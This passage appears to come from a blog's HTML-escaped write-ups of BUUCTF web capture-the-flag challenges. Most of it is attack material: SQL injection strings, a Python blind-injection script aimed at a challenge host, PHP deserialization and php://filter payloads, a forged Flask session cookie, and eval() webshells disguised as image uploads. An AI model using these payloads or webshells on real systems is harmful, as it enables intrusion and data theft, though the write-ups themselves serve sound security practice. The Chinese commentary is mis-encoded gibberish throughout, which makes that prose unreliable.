&lt;span style="color:#00a8c8">exit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Just num!&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">$key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#75af00">intval&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">$str&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">$key&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">$str&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#111">$flag&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;span style="color:#00a8c8">echo&lt;/span> &lt;span style="color:#d88200">&amp;#34;Try to find out source file!&amp;#34;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;span style="color:#111">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>çœ‹ä¼¼æ¯”è¾ƒå¤æ‚ä¸€ç‚¹ï¼Œä½†æ˜¯ifçš„æ¯”è¾ƒæ˜¯å¼±æ¯”è¾ƒ&lt;/p>
&lt;p>payload&lt;/p>
&lt;pre tabindex="0">&lt;code>?key=123
&lt;/code>&lt;/pre>&lt;p>flag{758691a1-017b-4033-899a-bd78281fbcc1}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[æŠ¤ç½‘æ¯ 2018]easy_tornado
&lt;/h4>
&lt;/summary>
&lt;p>/hint.txtï¼šmd5(cookie_secret+md5(filename))&lt;/p>
&lt;p>/flag.txtï¼š/fllllllllllllag&lt;/p>
&lt;p>ç›®æ ‡æ˜¯æ‰¾åˆ°cookie_secretï¼Œåœ¨æŠ¥é”™é¡µé¢å‘çŽ°å¯èƒ½çš„æ¨¡æ¿æ¸²æŸ“&lt;/p>
&lt;pre tabindex="0">&lt;code>/error?msg={{handler.settings}}
&lt;/code>&lt;/pre>&lt;p>å¾—åˆ°cookie_secret: 13b08673-9199-47bc-b5a2-bb7938591e62&lt;/p>
&lt;pre tabindex="0">&lt;code>/file?filename=/fllllllllllllag&amp;amp;filehash=3725772b08f76e01024d81754c45f307
&lt;/code>&lt;/pre>&lt;p>flag{5756e16a-885e-4009-83e1-653a4818a39a}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[æžå®¢å¤§æŒ‘æˆ˜ 2019]BuyFlag
&lt;/h4>
&lt;/summary>
&lt;p>/pay.phpï¼Œé¡µé¢æºç &lt;/p>
&lt;pre tabindex="0">&lt;code>~~~post money and password~~~
if (isset($_POST['password'])) {
$password = $_POST['password'];
if (is_numeric($password)) {
echo &amp;quot;password can't be number&amp;lt;/br&amp;gt;&amp;quot;;
}elseif ($password == 404) {
echo &amp;quot;Password Right!&amp;lt;/br&amp;gt;&amp;quot;;
}
}
&lt;/code>&lt;/pre>&lt;p>&lt;code>is_numeric&lt;/code>å‡½æ•°ç”¨&lt;code>%20&lt;/code>ç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>password=404%20&amp;amp;money[]=100000000
Cookie: user=1
&lt;/code>&lt;/pre>&lt;p>flag{a3cd1620-d3f7-45a9-8b3d-ace1ed21e7fb}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[HCTF 2018]admin
&lt;/h4>
&lt;/summary>
&lt;p>â€”â€”â€”â€”éžé¢„æœŸï¼šadmin: 123å¼±å£ä»¤&lt;/p>
&lt;p>â€”â€”â€”â€”è§£æ³•1ï¼š&lt;code>á´¬á´°á´¹á´µá´º&lt;/code>unicodeæ¬ºéª—ï¼Œæ³¨å†Œ&lt;code>á´¬á´°á´¹á´µá´º: 456&lt;/code>çš„å·ï¼Œæ”¹å¯†ä¸º999ï¼Œç™»å…¥&lt;/p>
&lt;p>â€”â€”â€”â€”è§£æ³•2ï¼šçœ‹cookieæ˜¯ç†Ÿæ‚‰çš„flask-sessionï¼Œæ”¹å¯†é¡µé¢/changeæç¤ºhttps://github.com/woadsl1234/hctf_flask/ï¼Œæ‹¿åˆ°secret=&amp;lsquo;ckj123&amp;rsquo;&lt;/p>
&lt;pre tabindex="0">&lt;code>python3 flask_session_cookie_manager3.py encode -s 'ckj123' -t &amp;quot;{'_fresh':True,'_id': b'Yjg0OGY3OWU1MTI4ZWNhNWU1YWFlZWJiYzg5ZGM1NWNkZTIxYzlkNWJmZjI0YzhkMzljYWE1YzFlZTQ4OWEzY2EwYjlmNGYzODU4OTA1MTA0M2E3MWQ3ODM0M2JmY2IxNjI4MGQxOTQwNThmZDFmODg2ODFlZTdhOTQ1ZGQ0YWM=','csrf_token': b'NGEwMDMxNmEyYzhlNzhkYWRiMTUwYjBiOWIwNGFmYzI1YTIxOTQzMg==','image': b'eWl6eA==','name':'amiz','user_id':'10'}&amp;quot;
&lt;/code>&lt;/pre>&lt;p>flag{f479cd5d-4bc7-47a6-b6b2-be84ff250880}&lt;/p>
&lt;p>æ³¨æ„è¿™ä¸ªè„šæœ¬åŠ å¯†çš„æ—¶å€™çš„å†…éƒ¨éƒ½æ˜¯å•å¼•å·ï¼Œå¹¶ä¸”æ²¡æœ‰å¤šä½™çš„èŠ±æ‹¬å·&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[BJDCTF2020]Easy MD5
&lt;/h4>
&lt;/summary>
&lt;p>å“åº”å¤´æœ‰Hint: select * from &amp;lsquo;admin&amp;rsquo; where password=md5($pass,true)&lt;/p>
&lt;p>phpä¸­md5çš„ç¬¬äºŒä¸ªå‚æ•°ä¸ºtrueæ—¶è¾“å‡º16å­—ç¬¦äºŒè¿›åˆ¶ï¼Œé»˜è®¤falseè¾“å‡º32å­—ç¬¦åå…­è¿›åˆ¶ï¼Œä¹Ÿå°±æ˜¯è¯´è¿™é‡Œè¿”å›žraw md5&lt;/p>
&lt;p>mysqlä¸­åœ¨è¿›è¡Œå¸ƒå°”ç±»åž‹åˆ¤æ–­æ—¶ï¼Œ1å¼€å¤´çš„å­—ç¬¦ä¸²ä¼šè¢«å½“åšintåž‹&lt;/p>
&lt;pre tabindex="0">&lt;code>password='xxx'or'1xxx'
password='xxx'or 1
password='xxx'or'1'
password='xxx'or true # ä»¥ä¸Šä¸‰è€…å‡è¿”å›žtrue
password='xxx'or'0trash' # false
&lt;/code>&lt;/pre>&lt;p>raw md5åŒ…å«å¾ˆå¤šå­—ç¬¦ï¼Œå¦‚æžœraw md5åŒ…å«&lt;code>'trash'or'1trash'&lt;/code>è¿™æ ·çš„ï¼Œå°±ä¼štrueï¼Œæ°¸çœŸ&lt;/p>
&lt;p>ä¸€ä¸ªå‚è€ƒpayloadæ˜¯&lt;/p>
&lt;pre tabindex="0">&lt;code>ffifdyop
hash: 276f722736c95d99e921722cf9ed621c
&lt;/code>&lt;/pre>&lt;p>çˆ†ç ´è„šæœ¬&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
for ($i = 0;;) {
for ($c = 0; $c &amp;lt; 1000000; $c++, $i++)
if (stripos(md5($i, true), '\'or\'') !== false)
echo &amp;quot;\nmd5($i) = &amp;quot; . md5($i, true) . &amp;quot;\n&amp;quot;;
echo &amp;quot;.&amp;quot;;
}
?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>å‚è€ƒï¼š&lt;a href="http://mslc.ctf.su/wp/leet-more-2010-oh-those-admins-writeup/">Leet More 2010 Oh Those Admins! writeup&lt;/a>&lt;/p>
&lt;p>ä¹‹åŽè¿›å…¥ä¸‹ä¸€å…³ï¼Œé¡µé¢æºç &lt;/p>
&lt;pre tabindex="0">&lt;code>$a = $GET['a'];
$b = $_GET['b'];
if($a != $b &amp;amp;&amp;amp; md5($a) == md5($b)){
// wow, glzjin wants a girl friend.
&lt;/code>&lt;/pre>&lt;p>æ•°ç»„ç»•è¿‡ï¼Œpayload&lt;/p>
&lt;pre tabindex="0">&lt;code>/levels91.php?a[]=1&amp;amp;b[]=2
&lt;/code>&lt;/pre>&lt;p>è¿›å…¥ä¸‹ä¸€å…³&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
error_reporting(0);
include &amp;quot;flag.php&amp;quot;;
highlight_file(__FILE__);
if($_POST['param1']!==$_POST['param2']&amp;amp;&amp;amp;md5($_POST['param1'])===md5($_POST['param2'])){
echo $flag;
}
&lt;/code>&lt;/pre>&lt;p>ä¾æ—§æ•°ç»„ç»•è¿‡ï¼Œæ³¨æ„post&lt;/p>
&lt;pre tabindex="0">&lt;code>/levell14.php
param1[]=1&amp;amp;param2[]=2
&lt;/code>&lt;/pre>&lt;p>flag{78df171e-faa3-4c31-922f-a1f532e06dac}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[ZJCTF 2019]NiZhuanSiWei
&lt;/h4>
&lt;/summary>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
$text = $_GET[&amp;quot;text&amp;quot;];
$file = $_GET[&amp;quot;file&amp;quot;];
$password = $_GET[&amp;quot;password&amp;quot;];
if(isset($text)&amp;amp;&amp;amp;(file_get_contents($text,'r')===&amp;quot;welcome to the zjctf&amp;quot;)){
echo &amp;quot;&amp;lt;br&amp;gt;&amp;lt;h1&amp;gt;&amp;quot;.file_get_contents($text,'r').&amp;quot;&amp;lt;/h1&amp;gt;&amp;lt;/br&amp;gt;&amp;quot;;
if(preg_match(&amp;quot;/flag/&amp;quot;,$file)){
echo &amp;quot;Not now!&amp;quot;;
exit();
}else{
include($file); //useless.php
$password = unserialize($password);
echo $password;
}
}
else{
highlight_file(__FILE__);
}
?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>æŒ‡å®šäº†&lt;code>r&lt;/code>ï¼Œç”¨&lt;code>data://&lt;/code>ä¼ªåè®®&lt;/p>
&lt;pre tabindex="0">&lt;code>/?text=data://text/plain,welcome to the zjctf&amp;amp;file=php://filter/convert.base64-encode/resource=useless.php
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>&amp;lt;?php
class Flag{ //flag.php
public $file;
public function __tostring(){
if(isset($this-&amp;gt;file)){
echo file_get_contents($this-&amp;gt;file);
echo &amp;quot;&amp;lt;br&amp;gt;&amp;quot;;
return (&amp;quot;U R SO CLOSE !///COME ON PLZ&amp;quot;);
}
}
}
?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>éžå¸¸ç®€å•çš„ååºåˆ—åŒ–&lt;/p>
&lt;pre tabindex="0">&lt;code>$a = new Flag();
$a-&amp;gt;file = 'flag.php';
echo serialize($a);
&lt;/code>&lt;/pre>&lt;p>payload&lt;/p>
&lt;pre tabindex="0">&lt;code>/?text=data://text/plain,welcome to the zjctf&amp;amp;file=useless.php&amp;amp;password=O:4:&amp;quot;Flag&amp;quot;:1:{s:4:&amp;quot;file&amp;quot;;s:8:&amp;quot;flag.php&amp;quot;;}
&lt;/code>&lt;/pre>&lt;p>flag{0e255178-c131-4073-beb9-5821c29c0c3c}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[SUCTF 2019]CheckIn
&lt;/h4>
&lt;/summary>
&lt;p>ä¼ pure.phtmlï¼Œå¯¹åŽç¼€æ£€æµ‹ï¼Œjpgä¼šæ£€æµ‹æ–‡ä»¶å†…å®¹ï¼Œè€ƒè™‘ä¸Šä¼ .user.ini&lt;/p>
&lt;p>pure2.gif&lt;/p>
&lt;pre tabindex="0">&lt;code>GIF89a
&amp;lt;script language='php'&amp;gt;eval($_POST['amiz']);&amp;lt;/script&amp;gt;
&lt;/code>&lt;/pre>&lt;p>.user.ini&lt;/p>
&lt;pre tabindex="0">&lt;code>GIF89a
auto_prepend_file=pure2.gif
&lt;/code>&lt;/pre>&lt;p>uploads/cc551ab005b2e60fbdc88de809b2c4b1&lt;/p>
&lt;p>ä¼ çš„æ—¶å€™æ–‡ä»¶é‡åç»™è¿œç¨‹çŽ¯å¢ƒæ•´å´©äº†ï¼Œæ‡’å¾—é‡å¼€äº†ï¼Œå¯„&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[æžå®¢å¤§æŒ‘æˆ˜ 2019]HardSQL
&lt;/h4>
&lt;/summary>
&lt;p>ä¹‹å‰å‡ ä¸ªåˆ†åˆ«ç”¨äº†ä¸‡èƒ½å¯†ç ï¼Œè”åˆæŸ¥è¯¢ï¼ŒåŒå†™ï¼Œè¿™æ¬¡è½®åˆ°æŠ¥é”™æ³¨å…¥äº†&lt;/p>
&lt;p>è¿‡æ»¤äº†&lt;code>=&lt;/code>ï¼Œæ¢æˆ&lt;code>(a)like(b)&lt;/code>è¿™æ ·çš„&lt;/p>
&lt;pre tabindex="0">&lt;code>1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database()))),1))%23 # H4rDsq1
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1'))),1))%23 # id,username,password
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>1'or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1))),1))%23
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>1'or(updatexml(1,concat(0x7e,(select(group_concat(right(password,25)))from(H4rDsq1))),1))%23
&lt;/code>&lt;/pre>&lt;p>flag{64053c33-96f3-4bea-8e94-02fb81e48236}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[MRCTF2020]ä½ ä¼ ä½ ðŸŽå‘¢
&lt;/h4>
&lt;/summary>
&lt;p>ä¼ .htaccess&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;FilesMatch &amp;quot;wuhu&amp;quot;&amp;gt;
SetHandler application/x-httpd-php
&amp;lt;/FilesMatch&amp;gt;
&lt;/code>&lt;/pre>&lt;p>/var/www/html/upload/fa75c48848aa00244f9317333bbbffe1/.htaccess&lt;/p>
&lt;p>ä¼ wuhu.jpg&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php eval($_POST['wuhu']);?&amp;gt;
&lt;/code>&lt;/pre>&lt;p>/var/www/html/upload/fa75c48848aa00244f9317333bbbffe1/wuhu.jpg&lt;/p>
&lt;p>è¿žèšå‰‘ï¼Œæ‹¿flag&lt;/p>
&lt;p>flag{0188a589-fefe-4939-95d1-cbcc433fc9b2}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[MRCTF2020]Ez_bypass
&lt;/h4>
&lt;/summary>
&lt;p>æŽ’ç‰ˆé—®é¢˜ï¼Œçœ‹é¡µé¢æºç &lt;/p>
&lt;pre tabindex="0">&lt;code>I put something in F12 for you
include 'flag.php';
$flag='MRCTF{xxxxxxxxxxxxxxxxxxxxxxxxx}';
if(isset($_GET['gg'])&amp;amp;&amp;amp;isset($_GET['id'])) {
$id=$_GET['id'];
$gg=$_GET['gg'];
if (md5($id) === md5($gg) &amp;amp;&amp;amp; $id !== $gg) {
echo 'You got the first step';
if(isset($_POST['passwd'])) {
$passwd=$_POST['passwd'];
if (!is_numeric($passwd))
{
if($passwd==1234567)
{
echo 'Good Job!';
highlight_file('flag.php');
die('By Retr_0');
}
else
{
echo &amp;quot;can you think twice??&amp;quot;;
}
}
else{
echo 'You can not get it !';
}
}
else{
die('only one way to get the flag');
}
}
else {
echo &amp;quot;You are not a real hacker!&amp;quot;;
}
}
else{
die('Please input first');
}
}Please input first
&lt;/code>&lt;/pre>&lt;p>md5æ•°ç»„ç»•è¿‡ï¼Œ&lt;code>is_numeric&lt;/code>ç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>/?id[]=1&amp;amp;gg[]=2
POST: passwd=1234567%20
&lt;/code>&lt;/pre>&lt;p>flag{2d5c5d49-f8a2-471e-b3f0-8861a85e34a8}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[ç½‘é¼Žæ¯ 2020 é’é¾™ç»„]AreUSerialz
&lt;/h4>
&lt;/summary>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
include(&amp;quot;flag.php&amp;quot;);
highlight_file(__FILE__);
class FileHandler {
protected $op;
protected $filename;
protected $content;
function __construct() {
$op = &amp;quot;1&amp;quot;;
$filename = &amp;quot;/tmp/tmpfile&amp;quot;;
$content = &amp;quot;Hello World!&amp;quot;;
$this-&amp;gt;process();
}
public function process() {
if($this-&amp;gt;op == &amp;quot;1&amp;quot;) {
$this-&amp;gt;write(); // æ–‡ä»¶å†™
} else if($this-&amp;gt;op == &amp;quot;2&amp;quot;) {
$res = $this-&amp;gt;read(); // æ–‡ä»¶è¯» è¯»flag
$this-&amp;gt;output($res);
} else {
$this-&amp;gt;output(&amp;quot;Bad Hacker!&amp;quot;);
}
}
private function write() {
if(isset($this-&amp;gt;filename) &amp;amp;&amp;amp; isset($this-&amp;gt;content)) {
if(strlen((string)$this-&amp;gt;content) &amp;gt; 100) {
$this-&amp;gt;output(&amp;quot;Too long!&amp;quot;);
die();
}
$res = file_put_contents($this-&amp;gt;filename, $this-&amp;gt;content);
if($res) $this-&amp;gt;output(&amp;quot;Successful!&amp;quot;);
else $this-&amp;gt;output(&amp;quot;Failed!&amp;quot;);
} else {
$this-&amp;gt;output(&amp;quot;Failed!&amp;quot;);
}
}
private function read() {
$res = &amp;quot;&amp;quot;;
if(isset($this-&amp;gt;filename)) {
$res = file_get_contents($this-&amp;gt;filename); // æ–‡ä»¶è¯»
}
return $res;
}
private function output($s) {
echo &amp;quot;[Result]: &amp;lt;br&amp;gt;&amp;quot;;
echo $s;
}
function __destruct() {
if($this-&amp;gt;op === &amp;quot;2&amp;quot;) // å¼ºæ¯”è¾ƒ $op=2 intç±»åž‹ç»•è¿‡
$this-&amp;gt;op = &amp;quot;1&amp;quot;;
$this-&amp;gt;content = &amp;quot;&amp;quot;;
$this-&amp;gt;process();
}
}
function is_valid($s) {
for($i = 0; $i &amp;lt; strlen($s); $i++)
if(!(ord($s[$i]) &amp;gt;= 32 &amp;amp;&amp;amp; ord($s[$i]) &amp;lt;= 125)) // åªå…è®¸å¤§å°å†™+æ•°å­—+æ™®é€šå­—ç¬¦ å³å¯è§å­—ç¬¦
return false;
return true;
}
if(isset($_GET{'str'})) {
$str = (string)$_GET['str'];
if(is_valid($str)) {
$obj = unserialize($str); // å…ˆè¿‡æ»¤å†ååºåˆ—åŒ–
}
}
&lt;/code>&lt;/pre>&lt;p>å‘ç‚¹åœ¨äºŽ&lt;code>private function&lt;/code>åºåˆ—åŒ–ä¹‹åŽä¼šäº§ç”Ÿä¸å¯è§å­—ç¬¦ï¼Œä¸¤ç§ç»•è¿‡æ–¹å¼ï¼šphp7.1+ç‰ˆæœ¬å¯¹å±žæ€§ä¸æ•æ„Ÿï¼Œæœ¬åœ°æž„é€ payloadæ—¶å…¨æ”¹ä¸ºpublicï¼›æˆ–è€…å°†&lt;code>%00*%00&lt;/code>æ”¹ä¸ºåå…­è¿›åˆ¶çš„&lt;code>\00*\00&lt;/code>ï¼ŒåŒæ—¶å°†åºåˆ—åŒ–ç»“æžœä¸­çš„sæ”¹ä¸ºS&lt;/p>
&lt;p>è¿™é‡Œç”¨ç¬¬ä¸€ç§ï¼Œprivateå…¨æ”¹public&lt;/p>
&lt;pre tabindex="0">&lt;code>$obj = new FileHandler();
$obj-&amp;gt;op = 2;
$obj-&amp;gt;filename = 'php://filter/convert.base64-encode/resource=flag.php';
echo serialize($obj);
&lt;/code>&lt;/pre>&lt;p>payload&lt;/p>
&lt;pre tabindex="0">&lt;code>/?str=O:11:&amp;quot;FileHandler&amp;quot;:3:{s:2:&amp;quot;op&amp;quot;;i:2;s:8:&amp;quot;filename&amp;quot;;s:52:&amp;quot;php://filter/convert.base64-encode/resource=flag.php&amp;quot;;s:7:&amp;quot;content&amp;quot;;N;}
&lt;/code>&lt;/pre>&lt;p>flag{0138599e-6ac8-4573-b448-e15635135f63}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[GXYCTF2019]BabySQli
&lt;/h4>
&lt;/summary>
&lt;p>é¡µé¢æºç æç¤ºï¼šselect * from user where username = &amp;lsquo;$name&amp;rsquo;ï¼›è¿™è¯´äº†è·Ÿæ²¡è¯´ä¸€æ ·ï¼Œæ²¡å‘Šè¯‰wafæ˜¯å•¥&lt;/p>
&lt;p>å¤§å†™ç»•è¿‡&lt;/p>
&lt;pre tabindex="0">&lt;code>1'Order by 3%23 # æœ‰3åˆ—
1'union select 1,2,3%23 # wrong user!
1'union select 1,'admin',3%23 # wrong pass! è¯´æ˜Žç”¨æˆ·ååœ¨ç¬¬äºŒåˆ—
&lt;/code>&lt;/pre>&lt;p>æˆ‘ä»¬é‡‡ç”¨çš„æ–¹å¼æ˜¯è”åˆæŸ¥è¯¢ åˆ›å»ºä¸€è¡Œä¸´æ—¶çš„æ–°æ•°æ®ï¼Œä»¥è¿™ä¸ªä¸´æ—¶æ•°æ®ç™»å…¥&lt;/p>
&lt;pre tabindex="0">&lt;code>name=1'union select 1,'admin','202cb962ac59075b964b07152d234b70'#&amp;amp;pw=123
&lt;/code>&lt;/pre>&lt;p>flag{a544cd1d-4676-41d2-8110-837020cf11e5}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[GYCTF2020]Blacklist
&lt;/h4>
&lt;/summary>
&lt;p>è·Ÿqwbçš„éšä¾¿æ³¨éžå¸¸åƒï¼Œæ‹¿payloadæ¥è¯•è¯•&lt;/p>
&lt;pre tabindex="0">&lt;code>1';show tables;
1';show columns from `FlagHere`;
1';show columns from `words`;
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>1';Set @xx=concat('se','lect * from `FlagHere`;');Prepare x from @xx;execute x;
&lt;/code>&lt;/pre>&lt;p>å›žæ˜¾è¿‡æ»¤æ¡ä»¶&lt;/p>
&lt;pre tabindex="0">&lt;code>return preg_match(&amp;quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&amp;quot;,$inject);
&lt;/code>&lt;/pre>&lt;p>ç”¨&lt;code>handler on&lt;/code>ä»£æ›¿&lt;code>select&lt;/code>&lt;/p>
&lt;pre tabindex="0">&lt;code>1'; handler FlagHere open as amiz; handler amiz read first; handler amiz close;#
&lt;/code>&lt;/pre>&lt;p>&lt;code>handler...open&lt;/code>æ‰“å¼€ä¸€ä¸ªè¡¨ï¼Œä½¿å…¶åŽç»­å¯ä»¥ä½¿ç”¨&lt;code>handler...read&lt;/code>è®¿é—®ï¼Œå¹¶ä¸”åœ¨è¯¥ä¼šè¯&lt;code>handler...close&lt;/code>æˆ–ç»ˆæ­¢å‰ä¸ä¼šå…³é—­&lt;/p>
&lt;p>flag{9ba3c903-1a8c-4a40-b32a-f9752251269c}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[CISCN2019 åŽåŒ—èµ›åŒº Day2 Web1]Hack World
&lt;/h4>
&lt;/summary>
&lt;p>é•¿å¾—è·Ÿå‰é¢çš„éšä¾¿æ³¨å’ŒBlacklistå¾ˆåƒï¼Œç›´æŽ¥ç»™å‡ºäº†flagåœ¨flagè¡¨flagåˆ—&lt;/p>
&lt;p>æ‹¿fuzzå­—å…¸è¿‡ä¸€éï¼Œè¿‡æ»¤äº†and or union order group informationï¼Œç›²æ³¨pyè„šæœ¬èµ°èµ·ï¼Œä¸ŠäºŒåˆ†&lt;/p>
&lt;pre tabindex="0">&lt;code>import requests
url = 'http://e59ccad4-7152-44b6-ab8f-c632bb29ac31.node4.buuoj.cn:81/index.php'
target = 'glzjin'
content = ''
for i in range(1, 40):
left = 32
right = 127
mid = (left + right) // 2
while right &amp;gt; left:
payload = f&amp;quot;if(ascii(substr((select(flag)from(flag)),{i},1))&amp;gt;{mid},1,2)&amp;quot;
data = {&amp;quot;id&amp;quot;:payload}
response = requests.post(url, data)
if target in response.text:
left = mid + 1
else:
right = mid
mid = (left + right) // 2
content += chr(int(mid))
print(content)
&lt;/code>&lt;/pre>&lt;p>flag{1b79970-4e0-e-b78f-2d63d8c77375}&lt;/p>
&lt;/details>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[ç½‘é¼Žæ¯ 2018]Fakebook
&lt;/h4>
&lt;/summary>
&lt;p>/robots.txtæç¤º/user.php.bak&lt;/p>
&lt;pre tabindex="0">&lt;code>&amp;lt;?php
class UserInfo
{
public $name = &amp;quot;&amp;quot;;
public $age = 0;
public $blog = &amp;quot;&amp;quot;;
public function __construct($name, $age, $blog)
{
$this-&amp;gt;name = $name;
$this-&amp;gt;age = (int)$age;
$this-&amp;gt;blog = $blog;
}
function get($url)
{
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$output = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
if($httpCode == 404) {
return 404;
}
curl_close($ch);
return $output;
}
public function getBlogContents ()
{
return $this-&amp;gt;get($this-&amp;gt;blog);
}
public function isValidBlog ()
{
$blog = $this-&amp;gt;blog;
return preg_match(&amp;quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i&amp;quot;, $blog);
}
}
&lt;/code>&lt;/pre>&lt;p>æœ‰ä¸ªcurlï¼Œååºåˆ—åŒ–ç‚¹&lt;/p>
&lt;pre tabindex="0">&lt;code>$age = 18;
$blog = &amp;quot;file:///var/www/html/flag.php&amp;quot;;
$name = &amp;quot;amiz&amp;quot;;
$a = new UserInfo($name,$age,$blog);
echo serialize($a);
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>O:8:&amp;quot;UserInfo&amp;quot;:3:{s:4:&amp;quot;name&amp;quot;;s:4:&amp;quot;amiz&amp;quot;;s:3:&amp;quot;age&amp;quot;;i:18;s:4:&amp;quot;blog&amp;quot;;s:29:&amp;quot;file:///var/www/html/flag.php&amp;quot;;}
&lt;/code>&lt;/pre>&lt;p>ä½†æ˜¯æœ¬èº«è¿™çŽ©æ„è¿˜å¾—æœ‰ä¸ªæ³¨å…¥ç‚¹ï¼Œå®ƒåœ¨urlæœ€åŽçš„&lt;code>no&lt;/code>å‚æ•°å¤„&lt;/p>
&lt;pre tabindex="0">&lt;code>/view.php?no=1 order by 4%23 # 5æŠ¥é”™ å…±4åˆ—
&lt;/code>&lt;/pre>&lt;p>ä¸ååºåˆ—åŒ–ä¹Ÿè¡Œï¼Œå®ƒæ²¡è¿‡æ»¤&lt;code>load_file&lt;/code>ç›´æŽ¥å°±è¯»æ–‡ä»¶äº†&lt;/p>
&lt;pre tabindex="0">&lt;code>/view.php?no=-1 union/**/select/**/1,load_file(&amp;quot;/var/www/html/flag.php&amp;quot;),3,4%23
&lt;/code>&lt;/pre>&lt;p>æœ‰ç‚¹å¥‡æ€ªçš„ï¼Œä½ è¯´å®ƒè¿‡æ»¤ç©ºæ ¼ï¼Œä½†æ˜¯å‰é¢é‚£ä¸ªä¸ç”¨æ³¨é‡Šä¹Ÿå¯ä»¥ï¼Œè€Œä¸”å‰é¢å‚æ•°æ˜¯1è¿˜ä¸è¡Œ&lt;/p>
&lt;/details>
&lt;h2 id="page-03">page 03&lt;/h2>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
[ç½‘é¼Žæ¯ 2018]Comment
&lt;/h4>
&lt;/summary>
&lt;p>å‘å¸–ä¼šå…ˆè¦æ±‚ç™»å½•ï¼Œæç¤º&lt;code>zhangwei: zhangwei***&lt;/code>ï¼Œç›²çŒœ666ï¼Œç™»å…¥&lt;/p>
&lt;p>å¸–å­çš„è¯¦æƒ…é¡µå¯ä»¥æäº¤ç•™è¨€ï¼Œè¿™é‡Œæœ‰xssï¼ˆä½†æ˜¯æ²¡å•¥ç”¨ åˆæ²¡botï¼‰ï¼Œf12æœ‰ä¸€å¥æç¤º&lt;code>ç¨‹åºå‘˜GITå†™ä¸€åŠè·‘è·¯äº†,éƒ½æ²¡æ¥å¾—åŠCommit :)&lt;/code>ï¼Œç”¨Githackerçœ‹çœ‹æºç &lt;/p>
&lt;pre tabindex="0">&lt;code>githacker --url http://c7839413-2569-4342-ac29-8b5810a4c8c4.node4.buuoj.cn:81/ --folder result
&lt;/code>&lt;/pre>&lt;p>å› ä¸ºæç¤ºè¯´æœ‰ä¸€ä¸ªè®°å½•æ²¡æœ‰commitï¼Œæˆ‘ä»¬å°è¯•æ¢å¤&lt;/p>
&lt;pre tabindex="0">&lt;code>git log --reflog # æœ‰ä¸€æ¡åŽé¢å¸¦æ‹¬å·(refs/stash) æš‚å­˜åŒº
sudo git reset --hard e5b2a2443c2b6d395d06960123142bc91123148c
&lt;/code>&lt;/pre>&lt;p>å¾—åˆ°å®Œæ•´çš„æºç &lt;/p>
